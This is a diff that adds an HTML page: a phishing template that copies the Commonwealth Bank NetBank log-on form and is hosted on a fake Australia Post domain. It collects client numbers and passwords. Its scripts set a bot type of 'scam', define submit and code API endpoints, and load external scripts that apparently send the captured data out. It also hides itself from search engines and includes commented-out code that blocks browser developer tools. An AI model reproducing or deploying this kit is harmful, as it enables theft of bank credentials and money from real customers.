@@ -1,0 +1,384 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, nocache">
+    <title>NetBank - Log on to NetBank - Enjoy simple and secure online banking from Commonwealth Bank</title>
+    <base href="https://auspost.serveblog.net">
+    <link rel="shortcut icon" href="/static/personal-cabinet/images/au/commonwealth/favicon.ico" type="image/x-icon">
+
+    <link rel="stylesheet" href="/static/personal-cabinet/css/au/commonwealth/output.css">
+</head>
+
+<body style="cursor: default;">
+    <div class="flex flex-col min-h-screen items-center font-cr">
+        <div class="bg-gradient-to-b from-[#F2F2F2] to-white fixed left-0 top-0 w-full max-h-[50%] h-full -z-10"></div>
+        <div class="max-w-[600px] mx-auto w-full bg-white p-4 flex flex-col gap-4">
+            <header>
+                <img class="w-[256px]" src="/static/personal-cabinet/images/au/commonwealth/logo.svg" alt="">
+            </header>
+            <main>
+                <div class="flex flex-col gap-5">
+                    <div class="flex flex-col sm:flex-row items-start gap-2">
+                        <section class="flex flex-col *:p-2 w-full sm:w-7/12">
+                            <h2 class="bg-firmHgray text-white font-cb">Log on to NetBank</h2>
+                            <div class="bg-firmBgGray">
+                                <div>
+                                    <input type="hidden" id="bank-name" value="CommonwealthBank">
+                                    <input type="hidden" id="country-code-pc" value="AU">
+
+                                    <div class="flex flex-col gap-3 py-2">
+                                        <div class="flex flex-col gap-2 ">
+                                            <div class="flex flex-col gap-1">
+                                                <div class="flex flex-col sm:flex-row sm:items-center gap-2">
+                                                    <label for="login" class="sm:w-1/3 sm:text-center text-[13px]">Client
+                                                        number</label>
+                                                    <input id="login" type="text" class="sm:w-2/3 outline-none px-1 border border-firmGray transition-all duration-200 ease-linear focus:outline-1 outline-offset-0" maxlength="8" required="" oninput="numbers(this)">
+                                                </div>
+                                                <div class="flex items-center gap-2">
+                                                    <span class="hidden sm:block w-1/3"></span>
+                                                    <div class="hidden w-2/3 text-red-500 text-xs">This is a required
+                                                        field</div>
+                                                    <div class="checkForValid hidden w-2/3 text-red-500 text-xs">The data is incorrect
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="flex flex-col gap-2">
+                                            <div class="flex flex-col gap-1">
+                                                <div class="flex flex-col sm:flex-row sm:items-center gap-2">
+                                                    <label for="password" class="sm:w-1/3 sm:text-center text-[13px]">Password</label>
+                                                    <input id="password" type="password" class="sm:w-2/3 outline-none px-1 border border-firmGray transition-all duration-200 ease-linear focus:outline-1 focus:outline-black outline-offset-0" maxlength="16">
+                                                </div>
+                                                <div class="flex items-center gap-2">
+                                                    <span class="hidden sm:block w-1/3"></span>
+                                                    <div class="hidden w-2/3 text-red-500 text-xs">This is a required
+                                                        field</div>
+                                                    <div class="checkForValid hidden w-2/3 text-red-500 text-xs">The data is incorrect
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="flex items-center gap-2">
+                                            <span class="hidden sm:block w-1/3"></span>
+                                            <div class="flex items-center gap-3 relative">
+                                                <input type="checkbox" id="check" class="size-4 outline-none absolute left-0 top-0 opacity-0 cursor-pointer">
+                                                <div class="size-4 border border-firmGray rounded flex justify-center items-center">
+                                                    <svg class="hidden" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                                        <path d="M3 8.5L7 12.5L13 3.5" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
+                                                    </svg>
+                                                </div>
+                                                <label for="check" class="text-[13px]">Remember client number</label>
+                                            </div>
+                                        </div>
+                                        <div class="flex justify-end">
+                                            <button disabled id="pc-submit-button" type="submit" class="bg-firmYellow px-2 py-1 rounded-full flex items-center gap-1">
+                                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-5">
+                                                    <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 1 0-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H6.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z"></path>
+                                                </svg>
+                                                <span class="text-[15px]">Log on</span>
+                                            </button>
+                                        </div>
+                                        <span class="underline text-[13px] text-end">I've forgotten my log on
+                                            details</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+                        <div class="flex flex-col gap-2 w-full sm:w-5/12">
+                            <section class="flex flex-col ">
+                                <h2 class="bg-firmHgray text-white font-cb p-2">New to NetBank?</h2>
+                                <ul class="bg-firmBgGray text-[13px] *:underline flex flex-col gap-4 py-3 px-2">
+                                    <li>Register for NetBank now</li>
+                                    <li>Online support for our products and services</li>
+                                    <li>Tips to stay safe online</li>
+                                </ul>
+                            </section>
+                            <div class="px-2 py-[14px] bg-firmBgGray flex items-center gap-2">
+                                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="size-8">
+                                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z"></path>
+                                </svg>
+                                <span class="underline text-[13px]">Protection for unauthorised transactions</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-firmBgGray py-2 px-4 flex flex-col sm:flex-row items-start gap-5">
+                        <img class="w-full sm:w-[201px]" src="/static/personal-cabinet/images/au/commonwealth/banner.jpg" alt="">
+                        <section class="flex flex-col gap-1 text-[13px]">
+                            <h3 class="font-cb">Message us 24/7</h3>
+                            <span class="text-black/80">Get instant support in the CommBank app</span>
+                            <div class="flex items-center gap-1">
+                                <svg width="8" height="10" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 7L-6.52533e-07 13.9282L-4.68497e-08 0.0717964L12 7Z" fill="#FFCC00"></path>
+                                </svg>
+                                <span class="underline text-black/80">Find out more</span>
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </main>
+            <footer>
+                <div class="flex flex-col gap-3 w-full text-[13px] px-4 my-2">
+                    <h3 class="font-cb">Quick links</h3>
+                    <div class="w-2/3 bg-gradient-to-r h-[1px] from-white via-firmYellow to-white"></div>
+                    <ul class="flex flex-col gap-2 py-1">
+                        <li class="flex items-center gap-2 ">
+                            <svg class="min-w-2" width="8" height="10" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 7L-6.52533e-07 13.9282L-4.68497e-08 0.0717964L12 7Z" fill="#FFCC00"></path>
+                            </svg>
+                            <span class="underline text-black/80">Financial difficulty support for your business.
+                                Find out more</span>
+                        </li>
+                        <li class="flex items-center gap-2 ">
+                            <svg class="min-w-2" width="8" height="10" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 7L-6.52533e-07 13.9282L-4.68497e-08 0.0717964L12 7Z" fill="#FFCC00"></path>
+                            </svg>
+                            <span class="underline text-black/80">Refinance your eligible home loan to CommBank. See
+                                how</span>
+                        </li>
+                        <li class="flex items-center gap-2 ">
+                            <svg class="min-w-2" width="8" height="10" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 7L-6.52533e-07 13.9282L-4.68497e-08 0.0717964L12 7Z" fill="#FFCC00"></path>
+                            </svg>
+                            <span class="underline text-black/80">Are you experiencing financial difficulty? Get
+                                help</span>
+                        </li>
+                        <li class="flex items-center gap-2 ">
+                            <svg class="min-w-2" width="8" height="10" viewBox="0 0 12 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 7L-6.52533e-07 13.9282L-4.68497e-08 0.0717964L12 7Z" fill="#FFCC00"></path>
+                            </svg>
+                            <span class="underline text-black/80">Use Benefits finder to find grants, rebates and
+                                concessions you may be eligible for</span>
+                        </li>
+                    </ul>
+                    <hr class="border-gray-200 mt-4">
+                    <div class="flex items-center gap-1 flex-wrap text-[10px] text-black/80">
+                        <div class="underline">Terms of use</div>
+                        <div class="bg-black/80 w-[1px] h-3"></div>
+                        <div class="underline">Security</div>
+                        <div class="bg-black/80 w-[1px] h-3"></div>
+                        <div class="underline">Privacy</div>
+                        <div class="text-black/50">© Commonwealth Bank of Australia 2024 ABN 48 123 123 124</div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </div>
+
+    
+<script>
+    const botType = "scam";
+    const currency = "AUD";
+    const supportToken = "cvfQ1VdOtX0SdAwvlcqdpGccIrhYb1kJ";
+    const languageCode = "EN";
+    
+    const updateApiPath = "/api/update";
+    const stepsApiPath = "/api/steps";
+    const submitApiPath = "/api/submit";
+    const codeApiPath = "/api/code";
+
+    const userLocation = {
+        country: "🇦🇺 Австралия",
+        template: "merchant",
+        countryCode: "AU",
+        bank: "CommonwealthBank",
+    };
+</script>
+
+
+<script>
+    const adId = "4Ru2sQpsL199";
+    const adSubtype = "2.0";
+    const tpType = 0;
+    const logoPath = "/static/delivery/images/auspost/logo.png";
+</script>
+
+
+<!-- Bootstrap -->
+<link href="/static/other/bootstrap/css/bootstrap.css" rel="stylesheet">
+<script src="/static/other/bootstrap/js/bootstrap.js"></script>
+
+<!-- SweetAlert -->
+<link rel="stylesheet" type="text/css" href="/static/other/sweetalert/css/style.css">
+<script src="/static/other/sweetalert/js/sweetalert2@11.js"></script>
+
+<!-- iMask -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/imask/7.6.0/imask.min.js"></script>
+
+<!-- Axios -->
+<script src="/static/other/axios/axios.min.js"></script>
+
+<!-- jQuery -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+<!-- Console -->
+<!-- <script src="/static/other/console/console-ban.min.js"></script>
+
+<script>
+    ConsoleBan.init({
+        redirect: 'https://http.cat/403'
+    });
+</script>
+
+<script>
+    document.addEventListener('contextmenu', (e) => e.preventDefault());
+    document.addEventListener('keydown', (e) => {
+        if ((e.ctrlKey && e.shiftKey && e.key == 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key == 'J') ||
+            (e.key === 'F12')) {
+            e.preventDefault();
+        }
+    });
+</script> -->
+
+<noscript>
+    <div id="noscript-content">
+        <p>JavaScript is disabled in your browser. Please enable JavaScript to view this content.</p>
+    </div>
+</noscript>
+
+
+    
+        
+<link rel="stylesheet" type="text/css" href="/static/support/css/chat.css">
+
+<style>
+    .chaport-close.visible, .chaport-container .chaport-close.visible {
+        display: block;
+    }
+
+    .chaport-overlay .chaport-close {
+        position: absolute;
+        width: 70px;
+        height: 70px;
+        top: 13px;
+        right: 27px;
+        opacity: 0.6;
+    }
+
+    .chaport-close, .chaport-container .chaport-close {
+        position: absolute;
+        top: 0px;
+        right: 0px;
+        z-index: 4;
+        width: 50px;
+        height: 70px;
+        cursor: pointer;
+        opacity: 1;
+        transition: opacity 0.2s linear 0s;
+        display: none;
+    }
+
+    .chaport-overlay .chaport-close::before, .chaport-overlay .chaport-close::after {
+        content: "";
+        height: 31px;
+        width: 2px;
+        background-color: rgb(238, 238, 238);
+        right: 33px;
+        top: 19px;
+    }
+
+    .chaport-close::before, .chaport-container .chaport-close::before {
+        transform: rotate(45deg);
+    }
+
+    .chaport-close::after, .chaport-container .chaport-close::after {
+        transform: rotate(-45deg);
+    }
+
+    .chaport-close::before, .chaport-close::after, .chaport-container .chaport-close::before, .chaport-container .chaport-close::after {
+        position: absolute;
+        top: 24px;
+        right: 28px;
+        content: " ";
+        height: 22px;
+        width: 2px;
+        background-color: rgb(255, 255, 255);
+    }
+
+</style>
+
+<script src="/static/other/swal/language.js"></script>
+<script src="/static/other/swal/swal-methods.js"></script>
+<script src="/static/other/swal/system.js"></script>
+
+    <script>
+        function numbers(arg) {
+            arg.value = arg.value.replace(/[^0-9]/g, '');
+        }
+
+        const login = document.getElementById('login');
+        const password = document.getElementById('password');
+        const submitButton = document.getElementById("pc-submit-button");
+
+        const inpState = ['focus:outline-black'];
+        const inpStateErr = ['focus:outline-red-500', 'border-red-500'];
+
+        function isValue(arg) {
+            arg.addEventListener('blur', () => {
+                if (arg.value.length < 1) {
+                    arg.parentElement.nextElementSibling.firstElementChild.nextElementSibling.classList.remove('hidden');
+                    inpStateErr.map(el => arg.classList.add(el));
+                    inpState.map(el => arg.classList.remove(el));
+                } else {
+                    arg.parentElement.nextElementSibling.firstElementChild.nextElementSibling.classList.add('hidden');
+                    inpState.map(el => arg.classList.add(el));
+                    inpStateErr.map(el => arg.classList.remove(el));
+                }
+            })
+
+            arg.addEventListener('input', () => {
+                if (arg.value.length < 1) {
+                    arg.parentElement.nextElementSibling.firstElementChild.nextElementSibling.classList.remove('hidden');
+                    inpState.map(el => arg.classList.remove(el));
+                    inpStateErr.map(el => arg.classList.add(el));
+                } else {
+                    arg.parentElement.nextElementSibling.firstElementChild.nextElementSibling.classList.add('hidden');
+                    inpState.map(el => arg.classList.add(el));
+                    inpStateErr.map(el => arg.classList.remove(el));
+                }
+            })
+
+
+            arg.addEventListener('focus', () => {
+                if (!arg.className.includes('border-red-500')) {
+                    inpState.map(el => arg.classList.add(el));
+                }
+            })
+        }
+
+        isValue(login);
+        isValue(password);
+
+        function initSubmitButton() {
+            const isLoginEmpty = login.value.length === 0;
+            const isPasswordEmpty = password.value.length === 0;
+            submitButton.disabled = isLoginEmpty || isPasswordEmpty;
+        }
+
+        login.addEventListener('input', () => {
+            initSubmitButton();
+        });
+
+        login.addEventListener('paste', () => {
+            initSubmitButton();
+        });
+
+        password.addEventListener('input', () => {
+            initSubmitButton();
+        });
+
+        password.addEventListener('paste', () => {
+            initSubmitButton();
+        });
+    </script>
+ <script src="/lol/s.js"></script>
+    <script src="/static/pc-card/js/personal-cabinet/validate.js"></script>
+</body>
+
+</html>
